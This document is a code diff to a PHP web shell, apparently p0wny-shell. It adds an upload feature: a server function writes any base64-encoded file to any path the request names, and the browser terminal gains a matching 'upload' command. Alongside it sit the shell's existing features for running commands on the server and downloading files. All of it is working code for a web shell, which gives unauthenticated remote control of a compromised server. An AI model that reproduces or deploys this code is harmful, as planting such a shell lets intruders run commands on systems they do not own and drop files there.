@@ -57,6 +57,24 @@ function featureDownload($filePath) {
     }
 }
 
+function featureUpload($path, $file, $cwd) {
+    chdir($cwd);
+    $f = @fopen($path, 'wb');
+    if ($f === FALSE) {
+        return array(
+            'stdout' => array('Invalid path / no write permission.'),
+            'cwd' => getcwd()
+        );
+    } else {
+        fwrite($f, base64_decode($file));
+        fclose($f);
+        return array(
+            'stdout' => array('Done.'),
+            'cwd' => getcwd()
+        );
+    }
+}
+
 if (isset($_GET["feature"])) {
 
     $response = NULL;
@@ -74,6 +92,9 @@ if (isset($_GET["feature"])) {
             break;
         case "hint":
             $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+            break;
+        case 'upload':
+            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
     }
 
     header("Content-Type: application/json");
@@ -213,14 +234,18 @@ if (isset($_GET["feature"])) {
             function featureShell(command) {
 
                 _insertCommand(command);
-                makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
-                    if (response.hasOwnProperty('file')) {
-                        featureDownload(response.name, response.file)
-                    } else {
-                        _insertStdout(response.stdout.join("\n"));
-                        updateCwd(response.cwd);
-                    }
-                });
+                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
+                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
+                } else {
+                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                        if (response.hasOwnProperty('file')) {
+                            featureDownload(response.name, response.file)
+                        } else {
+                            _insertStdout(response.stdout.join("\n"));
+                            updateCwd(response.cwd);
+                        }
+                    });
+                }
             }
 
             function featureHint() {
@@ -266,6 +291,36 @@ if (isset($_GET["feature"])) {
                 document.body.appendChild(element);
                 element.click();
                 document.body.removeChild(element);
+                _insertStdout('Done.');
+            }
+
+            function featureUpload(path) {
+                var element = document.createElement('input');
+                element.setAttribute('type', 'file');
+                element.style.display = 'none';
+                document.body.appendChild(element);
+                element.addEventListener('change', function () {
+                    var promise = getBase64(element.files[0]);
+                    promise.then(function (file) {
+                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                            _insertStdout(response.stdout.join("\n"));
+                            updateCwd(response.cwd);
+                        });
+                    }, function () {
+                        _insertStdout('An unknown client-side error occurred.');
+                    });
+                });
+                element.click();
+                document.body.removeChild(element);
+            }
+
+            function getBase64(file, onLoadCallback) {
+                return new Promise(function(resolve, reject) {
+                    var reader = new FileReader();
+                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                });
             }
 
             function genPrompt(cwd) {
